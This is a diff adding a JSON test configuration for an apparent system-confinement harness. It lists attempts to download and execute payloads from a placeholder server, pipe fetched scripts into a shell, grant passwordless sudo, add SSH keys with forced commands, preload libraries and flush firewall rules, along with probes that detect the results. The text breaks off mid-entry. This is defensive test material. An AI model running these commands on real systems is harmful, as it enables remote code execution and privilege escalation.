@@ -1,0 +1,1224 @@
+{
+ "adapter_tokens": {
+  "@MARKER@": "the unique guest marker path of the step"
+ },
+ "changes": {
+  "account-shell": {
+   "replace_line": [
+    "account user 1000 1000 users /bin/bash /home/user",
+    "account user 1000 1000 users /bin/sh /home/user"
+   ]
+  },
+  "case-extra-a": {
+   "add_slot": "case-extra-a"
+  },
+  "case-extra-b": {
+   "add_slot": "case-extra-b"
+  },
+  "case-extra-service": {
+   "add_slot": "case-extra-service"
+  },
+  "case-small": {
+   "remove_slot": "case-small-v1-package"
+  },
+  "firewall-port": {
+   "precondition_slot": "case-firewall-4446",
+   "replace_slot": [
+    "case-firewall-4446",
+    "case-firewall-4447"
+   ]
+  },
+  "hostname": {
+   "replace_slot": [
+    "test-hostname",
+    "case-hostname-changed"
+   ]
+  },
+  "test-firewall": {
+   "precondition_slot": "case-firewall-4446",
+   "remove_slot": "case-firewall-4446"
+  },
+  "test-user-timer": {
+   "unsupported": "INTERFACE 5: no timers and no per-user services"
+  }
+ },
+ "child_paths": {
+  "G-INSTALL": "@HOME@/x/root/usr/bin/case-small",
+  "G-UPDATER": "@HOME@/.local/bin/case-child /usr/local/bin/case-child @HOME@/project/bin/case-child"
+ },
+ "command_present": {
+  "G-ACCOUNT": "command -v useradd",
+  "G-BRING": "command -v curl",
+  "G-BUILD": "command -v gcc",
+  "G-DOWNLOAD": "command -v curl",
+  "G-FIREWALL": "command -v nft",
+  "G-HOST": "command -v hostname",
+  "G-INSTALL": "command -v confpkg",
+  "G-LOCALE": "command -v printf",
+  "G-MODULE": "command -v modprobe",
+  "G-MOUNT": "command -v mount",
+  "G-NETWORK": "command -v ip",
+  "G-RIGHTS": "command -v sudo",
+  "G-SAVED-NETWORK": "exit 1",
+  "G-SCRIPT": "command -v bash",
+  "G-SERVICE": "command -v confos",
+  "G-STARTUP": "command -v bash",
+  "G-SYSCTL": "command -v sysctl",
+  "G-TIME": "command -v ln"
+ },
+ "control_folder": "/home/user/control",
+ "controls": {
+  "G-STARTUP": {
+   "-": "bash @TARGET@/case-input",
+   "plugin directory": "python3 @TARGET@/case-input.py",
+   "plugin setting": "python3 @TARGET@/case-input.py"
+  }
+ },
+ "material": {
+  "G-SCRIPT": {
+   "case-input.pl": "payloads/case-input.pl",
+   "case-input.py": "payloads/case-input.py",
+   "case-marker-so.c": "payloads/case-marker-so.c",
+   "case-marker.c": "payloads/case-marker.c"
+  },
+  "G-STARTUP": {
+   "case-input": "payloads/unrecorded.sh",
+   "case-input.py": "payloads/case-input.py"
+  }
+ },
+ "payload_sha256": {
+  "build.sh": "26b775b68d3e1d36c55105f4e1075e48703536dfff9b3c34ac35c6ed3447ee42",
+  "case-extra-a-1.recipe": "14ba2b2c29491e6f8b51e747b26092bb884a56f89714b0ec2239997c62c0c3d8",
+  "case-extra-b-1.recipe": "3137ff70874f0dc1f2fb71feb383758e8225cc1056f92e89421b5d27edce1e4d",
+  "case-extra-service-1.recipe": "223613bfc11883655f0b96d251d21f914b421530677333d609cdde1709bf815a",
+  "case-input.pl": "5e6a2f75dbe0cf0e9cd8734c5a668a984ba5021778ecedf25992cca9ee2731ca",
+  "case-input.py": "dbb63a9d2433443f68e2b1335a3676cf982218986495fd0d2dd76541c108a670",
+  "case-marker-so.c": "f0d31df0501c77f9760f28ac21af836176331933e0c03747c39878eabdb2064d",
+  "case-marker.c": "c9acc4aadabce7909966f07578abb89750e0038052bf7b9bd73a08567729b4d0",
+  "case-probe-1.recipe": "ba31a78d18933e62416325005d0e576dadbc12bce63911f3ba9f2e11880f09d7",
+  "case-probe.c": "49f7871c7752d554112ff8b7bb2a7010902f1a336851022125e91f243b3fd6f2",
+  "case-rec.sudoers": "04cedb890c620edc01a87ed724d54754462936373e7fc1b349eccd15e4ce6b3c",
+  "case-rule.sudoers": "fcf898f3c5aee769bbc97d9ca8597748d390b450fb810a09a097eafc43e4e859",
+  "case-sleeper-1.recipe": "2947f0b726c6439dad4596add80395ecba300849d6fce2a3b780cbb354c10287",
+  "case-small-1.recipe": "89caad2f56132d5fed64577d22265efd5f68e662bc9c516b74703cf84a74c502",
+  "case-small-2.recipe": "ff0be27c71f3792f76dedfdf5e404bc5fe59b96a18cea86a07ef2c1bcb4f21e7",
+  "case-small.c": "bd5735def9f2064717e4ac3926ef8bca3846f51b05eb723857d3f1d53e6c90cc",
+  "cases-report.sh": "01c760c2750dcedee22ba4e3d969ccb7148b347ad24a5baa28f35ad0aa1c12cd",
+  "document.txt": "55f5e7400a77fa2507049b565a2aa8b8506ceee7870261eec6428f18b0219015",
+  "persistent.sh": "b8851f39502babaadc5788df152ba976de856a37a17446d5d68d2e94d3e80736",
+  "typed-input.sh": "27971be48aeeb640f372285f4465d8c6fd01b519b846c13cc7304b06445e7171",
+  "unrecorded.sh": "13f7df1b79c40c637423e413b6dffdda9c25683bc5aafc83901281ebdb23f370",
+  "values.txt": "f6b1f0308b4f36a84ba5a8d435586086f1bbd24948029a9b4e7ac8704723a09f"
+ },
+ "preludes": {
+  "case_fetch": "case_fetch() { curl -fsSL -o \"$2\" -- \"$1\"; }"
+ },
+ "private_tokens": [
+  "@SERVER@",
+  "@KEY_TYPE@",
+  "@KEY@"
+ ],
+ "probe_protocol": "exit 0 present, exit 1 absent, other status unobservable",
+ "probes": {
+  "marker": "test -s \"$CASE_MARKER\"",
+  "payload-executed": "test -s \"$CASE_MARKER\"",
+  "persistent-unrecorded-effect": "{ pgrep -f \"slee[p] 8640[67]\" >/dev/null; } || grep -q \"slee[p] 86407\" @HOME@/.profile 2>/dev/null || { o=$(confpkg list /) || exit 3; printf \"%s\\n\" \"$o\" | grep -q \"^case-small 2\"; }",
+  "startup-effect": "test -s \"$CASE_MARKER\"",
+  "unrecorded-installation": "o=$(confpkg list /) || exit 3; d=$(confos show) || exit 3; printf \"%s\\n\" \"$o\" | while read -r n ver; do [ \"$n\" = declaration ] && continue; printf \"%s\\n\" \"$d\" | grep -qx \"package $n $ver\\( .*\\)\\?\" || echo \"$n\"; done | grep -q . && exit 0; c=$(confpkg check / 2>&1) || { printf \"%s\\n\" \"$c\" | grep -q . && exit 0; }; for p in @CHILD_PATHS@; do [ -e \"$p\" ] && \"$p\" </dev/null >/dev/null 2>&1 && exit 0; done; test -s \"$CASE_MARKER\" && exit 0; exit 1"
+ },
+ "release": "0.67",
+ "removal": {
+  "firewall-rule": {
+   "present": "grep -q \"dport 4446\" /etc/confos/rules.nft",
+   "slot": "case-firewall-4446"
+  },
+  "program-and-process": {
+   "present": "command -v case-sleeper >/dev/null",
+   "slot": "case-sleeper",
+   "start": "nohup case-sleeper listen 7075 >/dev/null 2>&1 &"
+  },
+  "rights-rule": {
+   "already_declared": true,
+   "present": "test -e /etc/sudoers.d/case-rule",
+   "slot": "test-access-rule"
+  },
+  "service-and-process": {
+   "present": "s=$(confos services) || exit 3; printf \"%s\\n\" \"$s\" | grep -q \"^case-extra\" || command -v case-extra-service >/dev/null",
+   "slot": "case-extra-service"
+  }
+ },
+ "schema": 1,
+ "server": {
+  "case-probe-2": "gcc -O2 -DCASE_FETCH=\\\"curl\\\" payloads/case-probe.c (a different build presented as version 2)",
+  "case-small-2.confpkg": "confpkg build payloads/case-small-2.recipe in the clean bootstrap root",
+  "case-small.c": "payloads/case-small.c",
+  "document": "payloads/document.txt",
+  "payload": "gcc -static -O2 payloads/case-marker.c",
+  "payload.py": "payloads/case-input.py",
+  "payload.tar.gz": "tar of payload as case-marker",
+  "persistent.sh": "payloads/persistent.sh",
+  "selfextract.sh": "sh script with payload embedded (base64), extracting beside itself (se/) and running it"
+ },
+ "setting_controls": {
+  "G-ACCOUNT": "grep -q \"^user:x:1000:1000:\" /etc/passwd",
+  "G-FIREWALL": "o=$(confos rules 2>&1) || exit 3; true",
+  "G-HOST": "[ \"$(hostname)\" = case-test ]",
+  "G-INSTALL": "o=$(confpkg list /) || exit 3; printf \"%s\\n\" \"$o\" | grep -q \"^case-small 1\"",
+  "G-LOCALE": "grep -q \"^LANG=C.UTF-8\" /etc/locale.conf",
+  "G-MOUNT": "awk \"\\$5==\\\"/\\\"{f=1} END{exit !f}\" /proc/self/mountinfo",
+  "G-NETWORK": "ip -o addr | grep -q \" 10.0.2.15/24\"",
+  "G-RIGHTS": "test -e /etc/sudoers.d/case-rule",
+  "G-SERVICE": "s=$(confos services) || exit 3; printf \"%s\\n\" \"$s\" | grep -q \"^case-service\"",
+  "G-SYSCTL": "[ \"$(cat /proc/sys/net/ipv4/ip_forward)\" = 0 ]",
+  "G-TIME": "readlink /etc/localtime | grep -q \"Etc/GMT-3$\""
+ },
+ "sources": {
+  "EXECUTORS.md": "ade0ce87faee8576286df85fd41e224ccd533329dce0f0911885d51cdaec2368",
+  "INTERFACE.md": "4dac7329dd1dfb6ede8876e3d16caf8cdda5571bf51b4279dff7af8b52de2ff1",
+  "declarations/base.conf": "406f6e36afc3620e4837b1b8fbdf5af748d88461b2d4a0233fad4d40643517f8"
+ },
+ "startup_sessions": [
+  "bash -l -i -c \"ls; exit 0\" </dev/null",
+  "python3 -c pass",
+  "MAKEFILES=@HOME@/case.mk make -f /dev/null -q x",
+  "MAKEFILES=/tmp/case.mk make -f /dev/null -q x",
+  "true"
+ ],
+ "tokens": {
+  "@CC@": "gcc",
+  "@DOCUMENT_URL@": "@SERVER@/document",
+  "@FETCH@": {
+   "prelude": "case_fetch",
+   "text": "case_fetch"
+  },
+  "@FETCH_STDOUT@": "curl -fsSL",
+  "@HOME@": "/home/user",
+  "@HOME_ROOT@": "/home",
+  "@PAYLOAD_URL@": "@SERVER@/payload",
+  "@PERSISTENT_URL@": "@SERVER@/persistent.sh",
+  "@PKG_INSTALL@": "confpkg install --root /",
+  "@PROBE_PATH@": "/usr/bin/case-probe",
+  "@PROBE_V2_URL@": "@SERVER@/case-probe-2",
+  "@READER@": "bash",
+  "@SH@": "/bin/sh",
+  "@SOURCE_URL@": "@SERVER@/case-small.c",
+  "@STARTUP_VALUE_ATTEMPT@": "case-probe values @HOME@/startup-value; bash @HOME@/startup-value",
+  "@TARGET@": "/home/user",
+  "@TEST_PORT@": "7072"
+ },
+ "unsupported_tokens": {
+  "@ACCOUNT_SOURCE@": "INTERFACE 5: no account server (question 9)",
+  "@FIREWALL_TOOL@": "bound per variant of G-FIREWALL only",
+  "@LOCALE_INPUT@": "bound per variant of G-LOCALE only",
+  "@LOCALE_TOOL@": "bound per variant of G-LOCALE only",
+  "@NETWORK_INPUT@": "bound per variant of G-NETWORK only",
+  "@NETWORK_TOOL@": "bound per variant of G-NETWORK only",
+  "@RIGHTS_INPUT@": "bound per variant of G-RIGHTS only",
+  "@RIGHTS_TOOL@": "bound per variant of G-RIGHTS only",
+  "@RULE_INPUT@": "bound per variant of G-FIREWALL only",
+  "@SAVED_NETWORK_TOOL@": "INTERFACE 5: no saved Wi-Fi networks",
+  "@SERVICE_TOOL@": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool",
+  "@STARTUP_ATTEMPT@": "bound per variant of G-STARTUP only",
+  "@TEST_MODULE@": "INTERFACE 5: loadable kernel modules: none",
+  "@TIME_INPUT@": "bound per variant of G-TIME only",
+  "@TIME_TOOL@": "bound per variant of G-TIME only"
+ },
+ "variants": {
+  "G-ACCOUNT": {
+   "chpasswd": {
+    "effect": "f=$(grep \"^user:\" /etc/shadow) || exit 3; [ \"$(printf %s \"$f\" | cut -d: -f2)\" != \"*\" ]",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "echo \"user:Case-pass-1\" | chpasswd",
+      "role": "root"
+     }
+    }
+   },
+   "groupadd": {
+    "effect": "grep -q \"^case-group:\" /etc/group",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "groupadd case-group",
+      "role": "root"
+     }
+    }
+   },
+   "passwd": {
+    "effect": "f=$(grep \"^user:\" /etc/shadow) || exit 3; [ \"$(printf %s \"$f\" | cut -d: -f2)\" != \"*\" ]",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "printf \"Case-pass-1\\nCase-pass-1\\n\" | passwd user",
+      "role": "root"
+     }
+    }
+   },
+   "useradd": {
+    "effect": "grep -q \"^case-user:\" /etc/passwd",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "useradd -m case-user",
+      "role": "root"
+     }
+    }
+   },
+   "usermod groups": {
+    "effect": "id -nG user | tr \" \" \"\\n\" | grep -qx root",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "usermod -a -G root user",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-BRING": {
+   "archive extract": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload.tar.gz @HOME@/brought.tgz && mkdir -p @HOME@/b && tar -xzf @HOME@/brought.tgz -C @HOME@/b && @HOME@/b/case-marker",
+      "role": "user"
+     }
+    }
+   },
+   "container engine": {
+    "unsupported": "PROGRAMS.md and EXECUTORS.md: no container runtime in 0.67; a brought engine is a brought executable, covered by \"plain executable\""
+   },
+   "interpreter": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload.py @HOME@/brought.py && python3 @HOME@/brought.py",
+      "role": "user"
+     }
+    }
+   },
+   "plain executable": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload @HOME@/brought && chmod +x @HOME@/brought && @HOME@/brought",
+      "role": "user"
+     }
+    }
+   },
+   "self-extracting wrapper": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/selfextract.sh @HOME@/brought.sh && sh @HOME@/brought.sh",
+      "role": "user"
+     }
+    }
+   },
+   "user/root": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload /root/brought && chmod +x /root/brought && /root/brought",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-BUILD": {
+   "/dev/shm": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "gcc @HOME@/case-small.c -o @TARGET@/case-small && r=$(@TARGET@/case-small) && printf \"%s\\n\" \"$r\" > \"$CASE_MARKER\"",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/dev/shm"
+    }
+   },
+   "/tmp": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "gcc @HOME@/case-small.c -o @TARGET@/case-small && r=$(@TARGET@/case-small) && printf \"%s\\n\" \"$r\" > \"$CASE_MARKER\"",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/tmp"
+    }
+   },
+   "command expansion": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "gcc @HOME@/case-small.c -o @HOME@/case-small && r=\"$($(printf %s @HOME@/case-small))\" && printf \"%s\\n\" \"$r\" > \"$CASE_MARKER\"",
+      "role": "user"
+     }
+    }
+   },
+   "home": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "gcc @HOME@/case-small.c -o @TARGET@/case-small && r=$(@TARGET@/case-small) && printf \"%s\\n\" \"$r\" > \"$CASE_MARKER\"",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "make install": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "printf \"install:\\n\\tmkdir -p @HOME@/.local/bin && gcc @HOME@/case-small.c -o @HOME@/.local/bin/case-small\\n\" > @HOME@/Makefile && make -C @HOME@ install && r=$(@HOME@/.local/bin/case-small) && printf \"%s\\n\" \"$r\" > \"$CASE_MARKER\"",
+      "role": "user"
+     }
+    }
+   },
+   "recipe file": {
+    "note": "EXECUTORS.md confpkg row: a recipe on a noexec mount is refused when confined",
+    "steps": {
+     "attempt": {
+      "command": "mkdir -p @HOME@/rsrc && cp @HOME@/case-small.c @HOME@/rsrc/ && printf \"name: case-r\\nversion: 1\\nbuild:\\nprintf executed > @MARKER@\\n\" > @HOME@/case-r.recipe && mkdir -p @HOME@/rout && confpkg build @HOME@/case-r.recipe --sources @HOME@/rsrc --out @HOME@/rout --work @HOME@/rwork",
+      "role": "user"
+     }
+    }
+   }
+  },
+  "G-DOWNLOAD": {
+   "/dev/shm": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload @TARGET@/brought && chmod +x @TARGET@/brought && @TARGET@/brought",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/dev/shm"
+    }
+   },
+   "/tmp": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload @TARGET@/brought && chmod +x @TARGET@/brought && @TARGET@/brought",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/tmp"
+    }
+   },
+   "/var/tmp": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload @TARGET@/brought && chmod +x @TARGET@/brought && @TARGET@/brought",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/var/tmp"
+    }
+   },
+   "archive extraction": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload.tar.gz @TARGET@/brought.tgz && mkdir -p @TARGET@/b && tar -xzf @TARGET@/brought.tgz -C @TARGET@/b && @TARGET@/b/case-marker",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "home": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/payload @TARGET@/brought && chmod +x @TARGET@/brought && @TARGET@/brought",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   }
+  },
+  "G-FIREWALL": {
+   "add rule": {
+    "effect": "o=$(confos rules 2>&1) || exit 3; printf \"%s\" \"$o\" | grep -q \"dport 4444\"",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "nft add rule inet confos input tcp dport 4444 drop",
+      "role": "root"
+     }
+    }
+   },
+   "remove recorded rule": {
+    "effect": "o=$(confos rules 2>&1) || exit 3; ! printf \"%s\" \"$o\" | grep -q \"dport 22\"",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "nft flush chain inet confos input",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-HOST": {
+   "set name": {
+    "effect": "[ \"$(hostname)\" = case-host ]",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "hostname case-host",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-INSTALL": {
+   "direct native executable path": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/case-small-2.confpkg /root/case-small-2.confpkg && /usr/bin/confpkg install --root / /root/case-small-2.confpkg",
+      "role": "root"
+     }
+    }
+   },
+   "extract then run": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/case-small-2.confpkg @HOME@/case-small-2.confpkg && mkdir -p @HOME@/x && tar -xJf @HOME@/case-small-2.confpkg -C @HOME@/x && @HOME@/x/root/usr/bin/case-small",
+      "role": "user"
+     }
+    }
+   },
+   "file import": {
+    "note": "the installer function of the system tool called from typed Python",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/case-small-2.confpkg /root/case-small-2.confpkg && python3 -c \"import importlib.machinery as m; c=m.SourceFileLoader('c', '/usr/bin/confpkg').load_module(); c.install_one('/root/case-small-2.confpkg', '/')\"",
+      "role": "root"
+     }
+    }
+   },
+   "forced purge": {
+    "unsupported": "FORMAT.md \"The tool\": confpkg has build, install, info, verify, list, unowned, check, treesum; there is no purge command"
+   },
+   "hold recorded version": {
+    "unsupported": "FORMAT.md \"The tool\": confpkg has build, install, info, verify, list, unowned, check, treesum; there is no hold command"
+   },
+   "installer hook": {
+    "unsupported": "FORMAT.md \"A package\": a package contains no scripts that run at installation; no hook facility exists"
+   },
+   "remove recorded package": {
+    "unsupported": "FORMAT.md \"The tool\": confpkg has build, install, info, verify, list, unowned, check, treesum; there is no remove command; removing image files by hand is breaking (W5-BREAK)"
+   },
+   "root install": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/case-small-2.confpkg /root/case-small-2.confpkg && confpkg install --root / /root/case-small-2.confpkg",
+      "role": "root"
+     }
+    }
+   },
+   "user install": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "case_fetch @SERVER@/case-small-2.confpkg @HOME@/case-small-2.confpkg && confpkg install --root / @HOME@/case-small-2.confpkg",
+      "role": "user"
+     }
+    }
+   }
+  },
+  "G-LOCALE": {
+   "system locale": {
+    "effect": "grep -q \"^LANG=en_US.UTF-8\" /etc/locale.conf",
+    "note": "no locale tool exists (no localectl); the attempt writes the file a locale tool would write",
+    "steps": {
+     "attempt": {
+      "command": "printf \"LANG=en_US.UTF-8\\n\" > /etc/locale.conf",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-MODULE": {
+   "load module": {
+    "unsupported": "INTERFACE 5: loadable kernel modules: none"
+   }
+  },
+  "G-MOUNT": {
+   "mount filesystem": {
+    "effect": "awk \"\\$5==\\\"/mnt\\\"{f=1} END{exit !f}\" /proc/self/mountinfo",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "mount -t tmpfs case-tmp /mnt",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-NETWORK": {
+   "route": {
+    "effect": "ip route | grep -q \"^192.0.2.0/24\"",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "ip route add 192.0.2.0/24 via 10.0.2.2",
+      "role": "root"
+     }
+    }
+   },
+   "temporary address": {
+    "effect": "ip -o addr | grep -q \" 10.0.2.99/\"",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "i=$(ip -o link | awk -F\": \" \"\\$2!=\\\"lo\\\"{print \\$2; exit}\") && ip addr add 10.0.2.99/24 dev \"$i\"",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-PIPE": {
+   "pipeline": {
+    "note": "the case command as written",
+    "steps": {}
+   },
+   "process substitution if supported": {
+    "steps": {
+     "pipeline": {
+      "command": "bash -c \"bash <(@FETCH_STDOUT@ @PERSISTENT_URL@)\"",
+      "role": "user"
+     }
+    }
+   },
+   "typed string substitution": {
+    "steps": {
+     "pipeline": {
+      "command": "@SH@ -c \"$(@FETCH_STDOUT@ @PERSISTENT_URL@)\"",
+      "role": "user"
+     }
+    }
+   }
+  },
+  "G-RIGHTS": {
+   "direct root write is W5-BREAK": {
+    "covered_by": "W5-BREAK"
+   },
+   "login key": {
+    "effect": "grep -q case-login-key /etc/dropbear/authorized_keys/user",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "printf \"%s %s case-login-key\\n\" \"@KEY_TYPE@\" \"@KEY@\" >> /etc/dropbear/authorized_keys/user",
+      "role": "root"
+     }
+    }
+   },
+   "rights editor": {
+    "effect": "test -e /etc/sudoers.d/case-new",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "printf \"%s\\n\" \"user ALL=(ALL) NOPASSWD: ALL\" | tee /etc/sudoers.d/case-new",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-SAVED-NETWORK": {
+   "create saved network": {
+    "unsupported": "INTERFACE 5: no saved Wi-Fi networks; no radio stack in the virtual machine base"
+   }
+  },
+  "G-SCRIPT": {
+   "debugger rc": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "cd @TARGET@ && printf \"%s\\n\" \"import os; open(os.environ['CASE_MARKER'], 'w').write('executed')\" > .pdbrc && printf \"c\\n\" | python3 -m pdb /usr/lib/python3.13/this.py >/dev/null",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "every shipped interpreter": {
+    "note": "one attempt per shipped reader of EXECUTORS.md: sh, python3, perl, gawk, sed, make, m4; a marker from any of them is a run",
+    "steps": {
+     "attempt": {
+      "command": "cd @TARGET@ && cp case-input s.sh && printf \"%s\\n\" \"import os\" \"open(os.environ['CASE_MARKER'], 'w').write('executed')\" > s.py && printf \"%s\\n\" \"open(my \\$f, '>', \\$ENV{CASE_MARKER}); print \\$f 'executed';\" > s.pl && printf \"%s\\n\" \"BEGIN { print \\\"executed\\\" > ENVIRON[\\\"CASE_MARKER\\\"] }\" > s.awk && printf \"1e . @TARGET@/s.sh\\n\" > s.sed && printf \"all:\\n\\t. @TARGET@/s.sh\\n\" > s.mk && printf \"syscmd(. @TARGET@/s.sh)\\n\" > s.m4 && { sh s.sh; python3 s.py; perl s.pl; gawk -f s.awk </dev/null; echo x | sed -f s.sed; make -f s.mk; m4 s.m4; } >/dev/null 2>&1; true",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "explicit plugin": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "gcc -shared -fPIC @HOME@/case-marker-so.c -o @TARGET@/case-plugin.so && LD_PRELOAD=@TARGET@/case-plugin.so /usr/bin/true",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "loader non-executable ELF": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "gcc @HOME@/case-marker.c -o @TARGET@/case-elf && chmod -x @TARGET@/case-elf && /lib64/ld-linux-x86-64.so.2 @TARGET@/case-elf",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "runtime nested reader": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "perl -e 'do \"@TARGET@/case-input.pl\"; 1'",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "shebang direct": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "{ printf \"#!/bin/sh\\n\"; cat @TARGET@/case-input; } > @TARGET@/case-shebang && chmod +x @TARGET@/case-shebang && @TARGET@/case-shebang",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "shell filename": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "bash @TARGET@/case-input",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "shell redirected file": {
+    "note": "EXECUTORS.md bash-redirect row",
+    "steps": {
+     "attempt": {
+      "command": "bash < @TARGET@/case-input",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "shell source": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "bash -c \". @TARGET@/case-input\"",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/home/user"
+    }
+   },
+   "temporary nested reader": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "python3 -c \"import importlib.util as u, shutil, tempfile; d=tempfile.mkdtemp(dir='@TARGET@'); p=d+'/m.py'; shutil.copy('@HOME@/case-input.py', p); s=u.spec_from_file_location('m', p); s.loader.exec_module(u.module_from_spec(s))\"",
+      "role": "user"
+     }
+    },
+    "tokens": {
+     "@TARGET@": "/tmp"
+    }
+   }
+  },
+  "G-SERVICE": {
+   "at": {
+    "unsupported": "no at in the 0.67 base (base.conf)"
+   },
+   "delayed timer": {
+    "unsupported": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool, no timers"
+   },
+   "disable/mask recorded service": {
+    "effect": "sleep 5; s=$(confos services) || exit 3; printf \"%s\\n\" \"$s\" | grep \"^case-service\" | grep -q \" - \"",
+    "note": "killing the process of a recorded service; effect present = the service stays stopped",
+    "steps": {
+     "attempt": {
+      "command": "pkill -x case-probe; sleep 3; true",
+      "role": "root"
+     }
+    }
+   },
+   "linger": {
+    "unsupported": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool, no per-user session manager"
+   },
+   "root crontab": {
+    "unsupported": "no cron in the 0.67 base (base.conf)"
+   },
+   "root crontab for another user": {
+    "unsupported": "no cron in the 0.67 base (base.conf)"
+   },
+   "root service link": {
+    "unsupported": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool, no service link folder; the service table is a rendered file of the read-only image (writing it is W5-BREAK)"
+   },
+   "service parameter": {
+    "unsupported": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool, no tool that changes the parameters of a service"
+   },
+   "user crontab": {
+    "unsupported": "no cron in the 0.67 base (base.conf)"
+   },
+   "user persistent": {
+    "unsupported": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool, no per-user services"
+   },
+   "user transient": {
+    "unsupported": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool, no transient service units"
+   }
+  },
+  "G-STARTUP": {
+   "SSH Match exec": {
+    "unsupported": "dbclient reads no configuration file with Match exec (EXECUTORS.md: only -J)"
+   },
+   "SSH ProxyCommand": {
+    "note": "dbclient -J runs the proxy command (EXECUTORS.md dbclient row)",
+    "steps": {
+     "attempt": {
+      "command": "dbclient -y -J \"sh @HOME@/case-input\" case-nowhere true </dev/null; true",
+      "role": "user"
+     }
+    }
+   },
+   "SSH rc": {
+    "note": "INTERFACE 3: the SSH server reads only /etc/dropbear/authorized_keys",
+    "steps": {
+     "attempt": {
+      "command": "mkdir -p @HOME@/.ssh && cp @HOME@/case-input @HOME@/.ssh/rc; true",
+      "role": "user"
+     }
+    }
+   },
+   "authorized key login": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "mkdir -p @HOME@/.ssh && printf \"command=\\\". @HOME@/case-input\\\" %s %s case-forced\\n\" \"@KEY_TYPE@\" \"@KEY@\" >> @HOME@/.ssh/authorized_keys; true",
+      "role": "user"
